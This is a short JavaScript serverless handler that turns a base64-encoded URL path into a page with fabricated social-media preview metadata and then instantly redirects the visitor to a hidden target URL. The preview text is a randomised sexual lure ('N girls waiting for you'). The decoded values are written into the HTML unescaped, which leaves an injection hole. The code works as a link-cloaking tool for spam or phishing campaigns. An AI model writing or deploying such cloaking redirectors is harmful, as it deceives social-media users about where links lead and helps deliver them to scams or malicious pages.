export async function onRequest(context) {
    const { params } = context;
    const base64Data = params.path[0];

    if (!base64Data || base64Data === "index.html") {
        return context.next();
    }

    try {
        const data = JSON.parse(atob(base64Data));
        const title = data.t || "";
        const image = data.i || "";
        const target = data.u || "";

        // --- LOGIC RANDOM DESKRIPSI DI SINI ---
        const count = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
        const formattedCount = count.toLocaleString('en-US'); // Format 10,000
        const templates = [
            `${formattedCount} Girls ready for you`,
            `${formattedCount} girls waiting for you`
        ];
        const randomDesc = templates[Math.floor(Math.random() * templates.length)];

        const html = `<!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>${title}</title>
            <meta property="og:title" content="${title}" />
            <meta property="og:description" content="${randomDesc}" />
            <meta property="og:image" content="${image}" />
            <meta property="og:type" content="video.other" />
            <meta name="twitter:card" content="summary_large_image">
            
            <script>window.location.replace("${target}");</script>
            <meta http-equiv="refresh" content="0;url=${target}">
        </head>
        <body style="background:#000;"></body>
        </html>`;

        return new Response(html, {
            headers: { "content-type": "text/html;charset=UTF-8" },
        });
    } catch (e) {
        return new Response("Invalid URL", { status: 400 });
    }
}
